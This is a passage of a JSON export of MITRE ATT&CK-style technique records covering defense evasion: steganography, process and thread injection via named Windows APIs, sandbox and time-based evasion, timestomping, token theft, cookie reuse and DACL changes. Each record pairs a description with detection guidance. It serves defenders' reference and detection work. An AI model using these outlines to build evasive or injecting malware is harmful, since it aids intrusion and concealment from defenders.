<\/p>\n<p>By the end of 2017, a threat group used\u202f<code>Invoke-PSImage<\/code>\u202fto hide <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a> commands in an image file (.png) and execute the code on a victim's system. In this particular case the <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a> code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)  <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detection of steganography is difficult unless artifacts are left behind by the obfuscation process that are detectable with a known signature. Look for strings are other signatures left in system artifacts related to decoding steganography.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":761,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":761,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":761,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":764,"name":"T1553 - Subvert Trust Controls","sort_id":0,"external_id":"T1553","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.<\/p>\n<p>Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct <a href=\"https:\/\/attack.mitre.org\/techniques\/T1222\">File and Directory Permissions Modification<\/a> or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1112\">Modify Registry<\/a> in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates) <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers. Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. (Citation: SpectorOps Subverting Trust Sept 2017) A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017)\n\nAnalyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure \"Hide Microsoft Entries\" and \"Hide Windows Entries\" are both deselected.(Citation: SpectorOps Subverting Trust Sept 2017) \n\nMonitor and investigate attempts to modify extended file attributes with utilities such as <code>xattr<\/code>. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":764,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":764,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":764,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":767,"name":"T1497.001 - System Checks","sort_id":0,"external_id":"T1497.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1497\">Virtualization\/Sandbox Evasion<\/a> during automated discovery to shape follow-on behaviors. <\/p>\n<p>Specific checks may will vary based on the target and\/or adversary, but may involve behaviors such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1047\">Windows Management Instrumentation<\/a>, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a>, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1082\">System Information Discovery<\/a>, and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1012\">Query Registry<\/a> to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and\/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. <\/p>\n<p>Checks could include generic system properties such as uptime and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory\/drive size. <\/p>\n<p>Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer\/product fields for strings relating to virtual machine applications, and VME-specific hardware\/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I\/O port to send commands and receive output. <\/p>\n<p>Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Virtualization\/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":767,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":767,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":767,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":771,"name":"T1055.003 - Thread Execution Hijacking","sort_id":0,"external_id":"T1055.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. <\/p>\n<p>Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping\/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread<\/code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread <\/code>, <code>VirtualAllocEx<\/code>, <code>WriteProcessMemory<\/code>, <code>SetThreadContext<\/code>, then <code>ResumeThread<\/code> respectively.(Citation: Endgame Process Injection July 2017)<\/p>\n<p>This is very similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\/012\">Process Hollowing<\/a> but targets an existing process rather than creating a process in a suspended state.  <\/p>\n<p>Running code in the context of another process may allow access to the process's memory, system\/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread<\/code>, <code>SuspendThread<\/code>\/<code>SetThreadContext<\/code>\/<code>ResumeThread<\/code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx<\/code>\/<code>WriteProcessMemory<\/code>, may be used for this technique.(Citation: Endgame Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":771,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":772,"name":"T1055.005 - Thread Local Storage","sort_id":0,"external_id":"T1055.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. <\/p>\n<p>TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and\/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process\u2019 memory space using other <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\">Process Injection<\/a> techniques such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\/012\">Process Hollowing<\/a>.(Citation: FireEye TLS Nov 2017)<\/p>\n<p>Running code in the context of another process may allow access to the process's memory, system\/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread<\/code>, <code>SuspendThread<\/code>\/<code>SetThreadContext<\/code>\/<code>ResumeThread<\/code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx<\/code>\/<code>WriteProcessMemory<\/code>, may be used for this technique.(Citation: Endgame Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":772,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":773,"name":"T1497.003 - Time Based Evasion","sort_id":0,"external_id":"T1497.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.<\/p>\n<p>Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: <a href=\"https:\/\/attack.mitre.org\/techniques\/T1053\">Scheduled Task\/Job<\/a>). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled <a href=\"https:\/\/attack.mitre.org\/techniques\/T1104\">Multi-Stage Channels<\/a> to avoid analysis and scrutiny. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Time-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":773,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":773,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":773,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":775,"name":"T1070.006 - Timestomp","sort_id":0,"external_id":"T1070.006","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.<\/p>\n<p>Timestomping may be used along with file name <a href=\"https:\/\/attack.mitre.org\/techniques\/T1036\">Masquerading<\/a> to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Forensic techniques exist to detect aspects of files that have had their timestamps modified. (Citation: WindowsIR Anti-Forensic Techniques) It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":775,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":775,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":775,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":776,"name":"T1134.001 - Token Impersonation\/Theft","sort_id":0,"external_id":"T1134.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using <code>DuplicateToken(Ex)<\/code>. The token can then be used with <code>ImpersonateLoggedOnUser<\/code> to allow the calling thread to impersonate a logged on user's security context, or with <code>SetThreadToken<\/code> to assign the impersonated token to a thread.<\/p>\n<p>An adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas<\/code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)<\/code>, <code> ImpersonateLoggedOnUser <\/code>, and <code> SetThreadToken <\/code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":776,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":782,"name":"T1550 - Use Alternate Authentication Material","sort_id":0,"external_id":"T1550","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. <\/p>\n<p>Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)<\/p>\n<p>Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through <a href=\"https:\/\/attack.mitre.org\/tactics\/TA0006\">Credential Access<\/a> techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":782,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":782,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":782,"platform_id":9,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":783,"name":"T1497.002 - User Activity Based Checks","sort_id":0,"external_id":"T1497.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1497\">Virtualization\/Sandbox Evasion<\/a> during automated discovery to shape follow-on behaviors. <\/p>\n<p>Adversaries may search for user activity on the host based on variables such as the speed\/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017) <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"User activity-based checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":783,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":783,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":783,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":784,"name":"T1055.014 - VDSO Hijacking","sort_id":0,"external_id":"T1055.014","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. <\/p>\n<p>VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\/008\">Ptrace System Calls<\/a>. However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009) (Citation: Backtrace VDSO) (Citation: VDSO Aug 2005) (Citation: Syscall 2014)<\/p>\n<p>Running code in the context of another process may allow access to the process's memory, system\/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for malicious usage of system calls, such as ptrace and mmap, that can be used to attach to, manipulate memory, then redirect a processes' execution path. Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":784,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":789,"name":"T1550.004 - Web Session Cookie","sort_id":0,"external_id":"T1550.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)<\/p>\n<p>Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1539\">Steal Web Session Cookie<\/a>, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.<\/p>\n<p>There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for anomalous access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.","platforms":[{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":789,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":789,"platform_id":9,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":792,"name":"T1222.001 - Windows File and Directory Permissions Modification","sort_id":0,"external_id":"T1222.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may modify file or directory permissions\/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).<\/p>\n<p>Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)<\/p>\n<p>Adversaries can interact with the DACLs using built-in Windows commands, such as <code>icacls<\/code>, <code>takeown<\/code>, and <code>attrib<\/code>, which can grant adversaries higher permissions on specific files and folders. Further, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a> provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1546\/008\">Accessibility Features<\/a>, <a href=\"https:\/\/attack.mitre.org\/techniques\/T1037\">Boot or Logon Initialization Scripts<\/a>, or tainting\/hijacking other instrumental binary\/configuration files via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1574\">Hijack Execution Flow<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor and investigate attempts to modify DACLs and file\/directory ownership. Many of the commands used to modify DACLs and file\/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\nConsider enabling file\/directory permission change auditing on folders containing key binary\/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 2014)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":792,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":801,"name":"T1575 - Native Code","sort_id":0,"external_id":"T1575","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use Android\u2019s Native Development Kit (NDK) to write native functions that can achieve execution of binaries or functions. Like system calls on a traditional desktop operating system, native code achieves execution on a lower level than normal Android SDK calls.<\/p>\n<p>The NDK allows developers to write native code in C or C++ that is compiled directly to machine code, avoiding all intermediate languages and steps in compilation that higher level languages, like Java, typically have. The Java Native Interface (JNI) is the component that allows Java functions in the Android app to call functions in a native library.(Citation: Google NDK Getting Started)<\/p>\n<p>Adversaries may also choose to use native functions to execute malicious code since native actions are typically much more difficult to analyze than standard, non-native behaviors.(Citation: MITRE App Vetting Effectiveness)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"This is abuse of standard OS-level APIs and are therefore typically undetectable to the end user.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":801,"platform_id":10,"created_at":"2020-07-28 16:02:21","updated_at":"2020-07-28 16:02:21"}}]},{"id":803,"name":"T1576 - Uninstall Malicious Application","sort_id":0,"external_id":"T1576","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may include functionality in malware that uninstalls the malicious application from the device. 